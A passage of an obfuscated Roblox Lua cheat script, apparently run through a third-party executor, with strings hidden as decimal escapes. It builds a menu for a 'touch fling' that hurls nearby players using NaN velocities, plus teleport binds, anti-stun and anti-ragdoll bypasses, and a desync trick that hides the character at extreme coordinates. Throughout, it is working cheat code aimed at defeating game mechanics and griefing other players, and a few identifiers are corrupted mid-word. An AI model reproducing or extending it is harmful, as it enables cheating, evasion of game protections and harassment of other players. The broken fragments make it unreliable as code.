 ) pcall( function () _IlIllllllI.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IlIllllllI.Velocity = Vector3.zero end
 ) pcall( function () _IlIllllllI.RotVelocity = Vector3.zero end
 ) pcall( function () _IlIllllllI.CFrame = CFrame.new(0x0, -0x2710, 0x0) end
 ) pcall( function () _IlIllllllI:Destroy() end
 ) _IlIllllllI = nil end
 if _lIIIIlIIlI and _lIIIIlIIlI.Parent then pcall( function () sethiddenproperty(_lIIIIlIIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIIIIlIIlI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIIIIlIIlI.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lIIIIlIIlI.Velocity = Vector3.zero end
 ) pcall( function () _lIIIIlIIlI.RotVelocity = Vector3.zero end
 ) end
 task.spawn( function () RunService.Heartbeat:Wait() if _lllllIIIIl then return end
 local _lIllllIIll = _llIIIlIIll.Character local _IIlIIIlIlI = _lIllllIIll and _lIllllIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llllIIlIII = _lIllllIIll and _lIllllIIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIlIIIlIlI then pcall( function () sethiddenproperty(_IIlIIIlIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _llllIIlIII then pcall( function () _llllIIlIII:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) end
 if _lIIIIlIIlI and _lIIIIlIIlI.Parent then pcall( function () sethiddenproperty(_lIIIIlIIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIIIIlIIlI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIIIIlIIlI.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lIIIIlIIlI.Velocity = Vector3.zero end
 ) pcall( function () _lIIIIlIIlI.RotVelocity = Vector3.zero end
 ) end
 end
 ) end
 _IIllIlIlII = _llllIIIIll local function _lIIllIllIl(_llIIlIIlII) for _lllIlllIIl, _lIIIIIIIII in pairs(Players:GetPlayers()) do if _lIIIIIIIII ~= _llIIIlIIll and _lIIIIIIIII.Character then local _IllIIIIllI = _lIIIIIIIII.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIIlIllII = _lIIIIIIIII.Character:FindFirstChild("\072\117\109\097\110\111\105\100") if _IllIIIIllI and _IllIIIIllI.Parent and _llIIlIllII and _llIIlIllII.Health > 0x0 then if (_IllIIIIllI.Position - _llIIlIIlII.Position).Magnitude <= _llIIIIIlII then return _IllIIIIllI end
 end
 end
 end
 end
 local function _llIIlIlIlI() local _IIIIIlIlll = Instance.new("\080\097\114\116") _IIIIIlIlll.Size = Vector3.new(0x8, 0.2, 0x8) _IIIIIlIlll.Transparency = 0x1 _IIIIIlIlll.CanCollide = false _IIIIIlIlll.Name = game:GetService("\072\116\116\112\083\101\114\118\105\099\101"):GenerateGUID() _IIIIIlIlll.Parent = workspace return _IIIIIlIlll end
 local function _IIIlIllllI() if _IllIIlIIll.Unloaded then _llllIIIIll() if _lIlllIIIll then _lIlllIIIll:Disconnect() _lIlllIIIll = nil end
 return end
 local _lIllIIIIII = _IlIllIIllI.TouchFlingMethod and _IlIllIIllI.TouchFlingMethod.Value or "\078\111\114\109\097\108" local _lIIIIIllII = _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] and _lIllIIIIII == "\068\101\097\116\104" if not _lIIIIIllII then if _lllIIlllIl then _llllIIIIll() _lllIIlllIl = false end
 return end
 if _IIllIlIlIl then if _lllIIlllIl then _llllIIIIll() _lllIIlllIl = false end
 return end
 _lllIIlllIl = true local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IIIlIlllll and _IlIIIIIIll and _IlIIIIlIIl) or _IlIIIIlIIl.Health <= 0x0 then _llllIIIIll() return end
 local _IIIlllIIlI = 0x0/0x0 local _IIlllIIIIl = Vector3.new(_IIIlllIIlI, _IIIlllIIlI, _IIIlllIIlI) if not _IlIllllllI then _IlIllllllI = _llIIlIlIlI() end
 if _lIllIIIIII == "\068\101\097\116\104" then if not _lIlllIlIIl then local _llIllIlllI = _lIIllIllIl(_IlIIIIIIll) if _llIllIlllI ~= _IIlllIIlll then if _IIlllIIlll and _IIlllIIlll.Parent then pcall( function () sethiddenproperty(_IIlllIIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IIlllIIlll.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIlllIIlll.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IIlllIIlll.Velocity = Vector3.zero end
 ) pcall( function () _IIlllIIlll.RotVelocity = Vector3.zero end
 ) end
 if not _lllllIIIIl then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _IIlllIIlll = _llIllIlllI end
 if _llIllIlllI and _llIllIlllI.Parent then if not _lllllIIIIl then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIllIlllI) end
 ) end
 sethiddenproperty(_IlIIIIlIIl, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", _IIlllIIIIl) _IlIIIIIIll.AssemblyLinearVelocity = _IIlllIIIIl _IlIIIIIIll.AssemblyAngularVelocity = _IIlllIIIIl else if _IlIllllllI then pcall( function () sethiddenproperty(_IlIllllllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IlIllllllI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IlIllllllI.AssemblyAngularVelocity = Vector3.zero end
 ) _IlIllllllI.Anchored = true _IlIllllllI.CFrame = CFrame.new(0x0, -0x3E8, 0x0) end
 end
 else local _llIllIlllI = _lIIllIllIl(_IlIIIIIIll) if _llIllIlllI ~= _IIlllIIlll then if _IIlllIIlll and _IIlllIIlll.Parent then pcall( function () sethiddenproperty(_IIlllIIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IIlllIIlll.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIlllIIlll.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IIlllIIlll.Velocity = Vector3.zero end
 ) pcall( function () _IIlllIIlll.RotVelocity = Vector3.zero end
 ) end
 if not _lllllIIIIl then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _IIlllIIlll = _llIllIlllI end
 if _llIllIlllI and _llIllIlllI.Parent then _IlIllllllI.Anchored = false _IlIllllllI.CFrame = _llIllIlllI.CFrame * CFrame.new(0x0, -3.2, 0x0) if not _lllllIIIIl then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIllIlllI) end
 ) end
 sethiddenproperty(_IlIIIIlIIl, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", _IIlllIIIIl) _IlIIIIIIll.AssemblyLinearVelocity = _IIlllIIIIl _IlIIIIIIll.AssemblyAngularVelocity = _IIlllIIIIl _IlIllllllI.AssemblyLinearVelocity = _IIlllIIIIl mblyAngularVelocity = _IIlllIIIIl else _IlIllllllI.Anchored = false _IlIllllllI.CFrame = _IlIIIIIIll.CFrame * CFrame.new(0x0, -3.2, 0x0) if not _lllllIIIIl then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IlIllllllI) end
 ) end
 sethiddenproperty(_IlIIIIlIIl, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", _IIlllIIIIl) _IlIIIIIIll.AssemblyLinearVelocity = _IIlllIIIIl _IlIIIIIIll.AssemblyAngularVelocity = _IIlllIIIIl _IlIllllllI.AssemblyLinearVelocity = _IIlllIIIIl _IlIllllllI.AssemblyAngularVelocity = _IIlllIIIIl end
 end
 end
 end
 local function _lIIIIIIIlI() if not _IlIllllllI then _IlIllllllI = _llIIlIlIlI() end
 if not _lIlllIIIll then _lIlllIIIll = RunService.RenderStepped:Connect(_IIIlIllllI) end
 end
 _llIlllllII = _lIIIIIIIlI table.insert(_llIlllIlIl, function () _llllIIIIll() if _lIlllIIIll then _lIlllIIIll:Disconnect() _lIlllIIIll = nil end
 if _IllllIIllI then pcall( function () _IllllIIllI:Disconnect() end
 ) _IllllIIllI = nil end
 end
 ) end
 _IIIIlIIIll:AddInput("\084\111\117\099\104\070\108\105\110\103\088\073\110\112\117\116", { Text = "\088\032\086\097\108\117\101", Default = "\048", Numeric = true, Finished = false, Callback = function (_lIllIlIIll) local _llllIIllll = tonumber(_lIllIlIIll) if _llllIIllll then _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_llllIIllll, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) if _IlIllIIllI.TouchFlingX and _IlIllIIllI.TouchFlingX.SetValue then pcall( function () _IlIllIIllI.TouchFlingX:SetValue(math.clamp(_llllIIllll, 0x0, 1e38)) end
 ) end
 end
 end
 , }) _IIIIlIIIll:AddSlider("\084\111\117\099\104\070\108\105\110\103\088", { Text = "\088", Default = 0x0, Min = 0x0, Max = 1e38, Rounding = 0x1, Compact = true, Callback = function (tfX) _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(tfX, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) end
 , }) _IIIIlIIIll:AddInput("\084\111\117\099\104\070\108\105\110\103\089\073\110\112\117\116", { Text = "\089\032\086\097\108\117\101", Default = "\048", Numeric = true, Finished = false, Callback = function (_lIllIlIIll) local _llllIIllll = tonumber(_lIllIlIIll) if _llllIIllll then _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, _llllIIllll, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) if _IlIllIIllI.TouchFlingY and _IlIllIIllI.TouchFlingY.SetValue then pcall( function () _IlIllIIllI.TouchFlingY:SetValue(math.clamp(_llllIIllll, 0x0, 1e38)) end
 ) end
 end
 end
 , }) _IIIIlIIIll:AddSlider("\084\111\117\099\104\070\108\105\110\103\089", { Text = "\089", Default = 0x0, Min = 0x0, Max = 1e38, Rounding = 0x1, Compact = true, Callback = function (tfY) _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, tfY, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) end
 , }) _IIIIlIIIll:AddInput("\084\111\117\099\104\070\108\105\110\103\090\073\110\112\117\116", { Text = "\090\032\086\097\108\117\101", Default = "\048", Numeric = true, Finished = false, Callback = function (_lIllIlIIll) local _llllIIllll = tonumber(_lIllIlIIll) if _llllIIllll then _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, _llllIIllll) if _IlIllIIllI.TouchFlingZ and _IlIllIIllI.TouchFlingZ.SetValue then pcall( function () _IlIllIIllI.TouchFlingZ:SetValue(math.clamp(_llllIIllll, 0x0, 1e38)) end
 ) end
 end
 end
 , }) _IIIIlIIIll:AddSlider("\084\111\117\099\104\070\108\105\110\103\090", { Text = "\090", Default = 0x0, Min = 0x0, Max = 1e38, Rounding = 0x1, Compact = true, Callback = function (tfZ) _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, tfZ) end
 , }) task.defer( function () _IlIllIIllI(true) end
 ) _IIIIlIIIll:AddDivider() local _IIIlllIllI = _IIIIlIIIll:AddToggle("\084\111\103\087\101\108\100", { Text = _llIllllllI and "\065\116\116\097\099\104" or "\079\114\098\105\116", Default = false, Callback = function (weldToggleVal) if _lIllIlllll.Weld then return end
 if not weldToggleVal then if _IlIllIIllI.KPWeld then _IlIllIIllI.KPWeld.Toggled = false end
 if _lllllIIIIl then _IllIlIIIIl() end
 end
 end
 , }) _IIIlllIllI:AddKeyPicker("\075\080\087\101\108\100", { Default = "\072", Text = _llIllllllI and "\065\116\116\097\099\104" or "\079\114\098\105\116", SyncToggleState = false, Mode = "\084\111\103\103\108\101", NoUI = false, Callback = function (kpVal) if _lIllIlllll.Weld then return end
 if kpVal and not _IIlIlIIlIl.TogWeld.Value then RunService.RenderStepped:Wait() _lIllIlllll.Weld = true _IlIllIIllI.KPWeld.Toggled = false _IlIllIIllI.KPWeld:DoClick() _lIllIlllll.Weld = false return end
 if not _IIlIlIIlIl.TogWeld.Value then return end
 if _lIIlIIlIll() then return end
 _IllIlIIIIl() end
 , }) if _llIllllllI then _IIIIlIIIll:AddDropdown("\065\116\116\097\099\104\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = { "\083\116\114\101\110\103\116\104", "\072\105\116\098\111\120\032\065\099\099\117\114\097\116\101", "\079\114\098\105\116" }, Default = "\083\116\114\101\110\103\116\104", Callback = function (_lIllIlIIll) local _llIIIIIlII = _lIllIlIIll == "\079\114\098\105\116" pcall( function () _IlIllIIllI.WeldOffsetX:SetVisible( not _llIIIIIlII) end
 ) pcall( function () _IlIllIIllI.WeldOffsetY:SetVisible( not _llIIIIIlII) end
 ) pcall( function () _IlIllIIllI.WeldOffsetZ:SetVisible( not _llIIIIIlII) end
 ) pcall( function () _IlIllIIllI.AttachOrbitSpeed:SetVisible(_llIIIIIlII) end
 ) pcall( function () _IlIllIIllI.AttachOrbitDistance:SetVisible(_llIIIIIlII) end
 ) end
 , }) _IIIIlIIIll:AddSlider("\087\101\108\100\079\102\102\115\101\116\088", { Text = "\065\116\116\097\099\104\032\088", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x0 }) _IIIIlIIIll:AddSlider("\087\101\108\100\079\102\102\115\101\116\089", { Text = "\065\116\116\097\099\104\032\089", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x0 }) _IIIIlIIIll:AddSlider("\087\101\108\100\079\102\102\115\101\116\090", { Text = "\065\116\116\097\099\104\032\090", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x0 }) _IIIIlIIIll:AddSlider("\065\116\116\097\099\104\079\114\098\105\116\083\112\101\101\100", { Text = "\079\114\098\105\116\032\083\112\101\101\100", Default = 0xA, Min = 0x1, Max = 0x64, Rounding = 0x1, }) _IIIIlIIIll:AddSlider("\065\116\116\097\099\104\079\114\098\105\116\068\105\115\116\097\110\099\101", { Text = "\079\114\098\105\116\032\068\105\115\116\097\110\099\101", Default = 0x3, Min = 0x1, Max = 0x64, Rounding = 0x1, }) task.defer( function () pcall( function () _IlIllIIllI.AttachOrbitSpeed:SetVisible(false) end
 ) pcall( function () _IlIllIIllI.AttachOrbitDistance:SetVisible(false) end
 ) end
 ) else _IIIIlIIIll:AddSlider("\079\114\098\105\116\083\112\101\101\100", { Text = "\079\114\098\105\116\032\083\112\101\101\100", Default = 0xA, Min = 0x1, Max = 0x64, Rounding = 0x1, }) _IIIIlIIIll:AddSlider("\079\114\098\105\116\068\105\115\116\097\110\099\101", { Text = "\079\114\098\105\116\032\068\105\115\116\097\110\099\101", Default = 0x3, Min = 0x1, Max = 0x64, Rounding = 0x1, }) end
 _IIIIlIIIll:AddDivider() local _lIlIllllll = _IIIIlIIIll:AddToggle("\084\080\049", { Text = "\084\101\108\101\112\111\114\116\032\049", Default = false, Callback = function (_lIllIlIIll) if not _lIllIlIIll and _IlIllIIllI.TP1Bind:GetState() == true then _IlIllIIllI.TP1Bind.Toggled = false _IlIllIIllI.TP1Bind:DoClick() end
 pcall( function () _IlIllIIllI.TP1Bind.KeybindsToggle:SetVisibility(_lIllIlIIll) end
 ) end
 , }) _lIlIllllll:AddKeyPicker("\084\080\049\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\069", Text = "\084\101\108\101\112\111\114\116\032\049", Callback = function () _IlIllIIllI.TP1Bind.Toggled = false if not _IIlIlIIlIl.TP1 or not _IIlIlIIlIl.TP1.Value then return end
 local _IIIlIlllll = _llIlIlIlIl(_llIIIlIIll) local _IlIIIIIIll = _IIIlIlllll and _llIlIlllII(_IIIlIlllll) local _IlIIIIlIIl = _IIIlIlllll and _lIllIlIIlI(_IIIlIlllll) if _IIIlIlllll and _IlIIIIIIll and _IlIIIIlIIl and _IlIIIIlIIl.Health > 0x0 then local _lIIllllIIl = _IlIIIIIIll.CFrame * CFrame.new(_IlIllIIllI.TP1X.Value, _IlIllIIllI.TP1Y.Value, _IlIllIIllI.TP1Z.Value) _lIllllIlIl(_lIIllllIIl) end
 end
 , }) _IIIIlIIIll:AddSlider("\084\080\049\088", { Text = "\088", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _IIIIlIIIll:AddSlider("\084\080\049\089", { Text = "\089", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _IIIIlIIIll:AddSlider("\084\080\049\090", { Text = "\090", Default = 0x14, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _IIIIlIIIll:AddDivider() local _IlIIlIllll = _IIIIlIIIll:AddToggle("\084\080\050", { Text = "\084\101\108\101\112\111\114\116\032\050", Default = false, Callback = function (_lIllIlIIll) if not _lIllIlIIll and _IlIllIIllI.TP2Bind:GetState() == true then _IlIllIIllI.TP2Bind.Toggled = false _IlIllIIllI.TP2Bind:DoClick() end
 pcall( function () _IlIllIIllI.TP2Bind.KeybindsToggle:SetVisibility(_lIllIlIIll) end
 ) end
 , }) _IlIIlIllll:AddKeyPicker("\084\080\050\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\082", Text = "\084\101\108\101\112\111\114\116\032\050", Callback = function () _IlIllIIllI.TP2Bind.Toggled = false if not _IIlIlIIlIl.TP2 or not _IIlIlIIlIl.TP2.Value then return end
 local _IIIlIlllll = _llIlIlIlIl(_llIIIlIIll) local _IlIIIIIIll = _IIIlIlllll and _llIlIlllII(_IIIlIlllll) local _IlIIIIlIIl = _IIIlIlllll and _lIllIlIIlI(_IIIlIlllll) if _IIIlIlllll and _IlIIIIIIll and _IlIIIIlIIl and _IlIIIIlIIl.Health > 0x0 then local _lIIllllIIl = _IlIIIIIIll.CFrame * CFrame.new(_IlIllIIllI.TP2X.Value, _IlIllIIllI.TP2Y.Value, _IlIllIIllI.TP2Z.Value) _lIllllIlIl(_lIIllllIIl) end
 end
 , }) _IIIIlIIIll:AddSlider("\084\080\050\088", { Text = "\088", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _IIIIlIIIll:AddSlider("\084\080\050\089", { Text = "\089", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _IIIIlIIIll:AddSlider("\084\080\050\090", { Text = "\090", Default = -0x14, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) task.defer( function () pcall( function () _IlIllIIllI.TP1Bind.KeybindsToggle:SetVisibility(false) end
 ) pcall( function () _IlIllIIllI.TP2Bind.KeybindsToggle:SetVisibility(false) end
 ) end
 ) if _IlllIlIllI then _llIIlllIll:AddToggle("\067\117\115\116\111\109\070\114\111\110\116\068\097\115\104", { Text = "\067\117\115\116\111\109\032\070\114\111\110\116\032\068\097\115\104", Default = false, }) _llIIlllIll:AddSlider("\070\068\068\105\115\116\097\110\099\101", { Text = "\070\114\111\110\116\032\068\097\115\104\032\068\105\115\116\097\110\099\101", Default = 0xA5, Min = 0x0, Max = 0x1F4, Rounding = 0x1, }) _llIIlllIll:AddToggle("\067\117\115\116\111\109\083\105\100\101\068\097\115\104", { Text = "\067\117\115\116\111\109\032\083\105\100\101\032\068\097\115\104", Default = false, }) _llIIlllIll:AddSlider("\083\068\068\105\115\116\097\110\099\101", { Text = "\083\105\100\101\032\068\097\115\104\032\068\105\115\116\097\110\099\101\032\040\077\117\108\116\105\112\108\105\101\114\041", Default = 0x1, Min = 0.1, Max = 0x2, Rounding = 0x1, }) _llIIlllIll:AddSlider("\083\068\083\112\101\101\100", { Text = "\083\105\100\101\032\068\097\115\104\032\083\112\101\101\100", Default = 0x1, Min = 0.1, Max = 0x2, Rounding = 0x1, Tooltip = "\082\101\099\111\109\109\101\110\100\101\100\032\119\105\116\104\032\099\117\115\116\111\109\032\115\105\100\101\032\100\097\115\104\032\115\112\101\101\100\032\115\101\116\032\116\111\032\049\046\052\046", }) _llIIlllIll:AddToggle("\067\117\115\116\111\109\066\097\099\107\068\097\115\104", { Text = "\067\117\115\116\111\109\032\066\097\099\107\032\068\097\115\104", Default = false, }) _llIIlllIll:AddSlider("\066\068\068\105\115\116\097\110\099\101", { Text = "\066\097\099\107\032\068\097\115\104\032\068\105\115\116\097\110\099\101\032\040\077\117\108\116\105\112\108\105\101\114\041", Default = 0x1, Min = 0.1, Max = 0x2, Rounding = 0x1, }) _llIIlllIll:AddButton({ Text = "\082\101\115\101\116\032\116\111\032\068\101\102\097\117\108\116\115", Func = function () _IlIllIIllI.FDDistance:SetValue(0xA5) _IlIllIIllI.SDDistance:SetValue(0x1) _IlIllIIllI.SDSpeed:SetValue(0x1) _IlIllIIllI.BDDistance:SetValue(0x1) end
 , }) local function _IIllllIIII(_lllIlllIIl) for _lllIlllIIl, _IllIIIllII in pairs(_llIIllllIl) do _IllIIIllII:Disconnect() end
 table.clear(_llIIllllIl) if _IIllIIIlII then _IIllIIIlII:Destroy() _IIllIIIlII = nil end
 repeat task.wait() until _llIlIlIlIl(_llIIIlIIll) and _llIlIlllII(_llIlIlIlIl(_llIIIlIIll)) and _lIllIlIIlI(_llIlIlIlIl(_llIIIlIIll)) local _IlIlIIlIlI = _llIlIlIlIl(_llIIIlIIll) local _lIlllIlIlI = _IlIlIIlIlI and _llIlIlllII(_IlIlIIlIlI) or _IlIlIIlIlI local _lllIlIIlll = _IlIlIIlIlI and _lIllIlIIlI(_IlIlIIlIlI) or _IlIlIIlIlI if _IlIlIIlIlI and _lIlllIlIlI and _lllIlIIlll then local _IIlIlllIlI = {} _llIIllllIl[#_llIIllllIl+0x1] = _IlIlIIlIlI.DescendantAdded:Connect( function (descendant) if descendant:IsA("\083\111\117\110\100") and descendant.SoundId:match("\049\054\049\051\057\055\053\051\048\057\056") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\067\114\117\115\104\105\110\103\032\080\117\108\108") then local _IIlIIllIIl = tick() repeat _IIIIIIlIll({ Goal = "\075\101\121\080\114\101\115\115", Key = Enum.KeyCode.F }) RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0.5 _IIIIIIlIll({ Goal = "\075\101\121\082\101\108\101\097\115\101", Key = Enum.KeyCode.F }) elseif _IlIIlIllIl["\085\112\115\105\100\101\032\068\111\119\110"] and _lllIlIIlll and _lllIlIIlll.Health > 0x0 then elseif descendant:IsA("\065\099\099\101\115\115\111\114\121") then if table.find({"\083\108\111\119\101\100","\083\116\111\112\082\117\110\110\105\110\103","\067\111\109\098\111\083\116\117\110"}, descendant.Name) and rawget(_IlIllIIllI.CharacterExploits.Value, "\078\111\032\083\108\111\119") then if descendant.Name ~= "\083\108\111\119\101\100" then if descendant.Name == "\083\116\111\112\082\117\110\110\105\110\103" or descendant.Name == "\067\111\109\098\111\083\116\117\110" then _IIIIIIllII(descendant, false) end
 else local _lllIllIlII = _lllIlIIlll:GetPropertyChangedSignal("\087\097\108\107\083\112\101\101\100"):Connect( function () _lllIlIIlll.WalkSpeed = _IlIlIIlIlI:GetAttribute("\085\108\116\101\100") and (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) end
 ) _lllIlIIlll.WalkSpeed = _IlIlIIlIlI:GetAttribute("\085\108\116\101\100") and (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) repeat RunService.RenderStepped:Wait() until descendant.Parent ~= _IlIlIIlIlI _lllIllIlII:Disconnect() end
 elseif (descendant.Name == "\070\114\101\101\122\101" or descendant.Name == "\065\110\116\105\077\111\118\101") and rawget(_IlIllIIllI.CharacterExploits.Value, "\078\111\032\083\116\117\110") then local _IIIlllIIlI = _lllIlIIlll:GetPropertyChangedSignal("\087\097\108\107\083\112\101\101\100"):Connect( function () _lllIlIIlll.WalkSpeed = _IlIlIIlIlI:GetAttribute("\085\108\116\101\100") and (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) end
 ) _lllIlIIlll.WalkSpeed = _IlIlIIlIlI:GetAttribute("\085\108\116\101\100") and (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_IlIlIIlIlI:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) repeat RunService.RenderStepped:Wait() until descendant.Parent ~= _IlIlIIlIlI _IIIlllIIlI:Disconnect() elseif descendant.Name ~= "\078\111\074\117\109\112" or not rawget(_IlIllIIllI.CharacterExploits.Value, "\078\111\032\074\117\109\112\032\066\121\112\097\115\115") then if (descendant.Name == "\078\111\082\111\116\097\116\101" or desceame == "\078\111\082\111\116\097\116\101" or descendant.Name == "\078\111\082\111\116\097\116\101\085\108\116\105\109\097\116\101") and rawget(_IlIllIIllI.CharacterExploits.Value, "\078\111\032\082\111\116\097\116\105\111\110\115\032\066\121\112\097\115\115") then task.spawn(pcall, _IIIIIIllII, descendant, false) elseif descendant.Name ~= "\082\097\103\100\111\108\108" then if descendant.Name ~= "\082\097\103\100\111\108\108\083\105\109" then if descendant.Name ~= "\066\101\105\110\103\076\097\117\110\099\104\101\100" then if descendant.Name == "\084\104\114\111\119\084\114\097\115\104\099\097\110" then _IlIIlIllIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = true task.wait(0.25) _IlIIlIllIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false end
 elseif _IIlIlIIlIl.LaunchHide.Value and _lllIlIIlll.Health > 0x0 and not _IlIlIIlIlI:FindFirstChild("\069\120\116\114\097\072\105\116\098\111\120") then local _lIIlIIlIII = tick() repeat getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait() until tick() >= _lIIlIIlIII + 0x3 or (_IlIlIIlIlI:FindFirstChild("\076\097\117\110\099\104\069\110\100\101\100") or _lllIlIIlll.Health <= 0x0) getgenv().desync = nil end
 elseif rawget(_IlIllIIllI.CharacterExploits.Value, "\065\110\116\105\032\082\097\103\100\111\108\108") then task.spawn(pcall, _IIIIIIllII, descendant, false) end
 else if rawget(_IlIllIIllI.CharacterExploits.Value, "\065\110\116\105\032\082\097\103\100\111\108\108") then descendant:Remove() end
 if _IIlIlIIlIl.RagdollHide.Value and _lllIlIIlll.Health > 0x0 and not _IlIlIIlIlI:FindFirstChild("\069\120\116\114\097\072\105\116\098\111\120") then task.spawn( function () repeat getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait() until not _IIlIlIIlIl.RagdollHide.Value or descendant.Parent ~= _IlIlIIlIlI or _lllIlIIlll.Health <= 0x0 getgenv().desync = nil end
 ) end
 if _IIlIlIIlIl.AutoRagdollCancel.Value then _IIIIIIlIll({ Dash = Enum.KeyCode.S, Key = Enum.KeyCode.Q, Goal = "\075\101\121\080\114\101\115\115" }) end
 end
 else task.spawn(pcall, _IIIIIIllII, descendant, false) end
 end
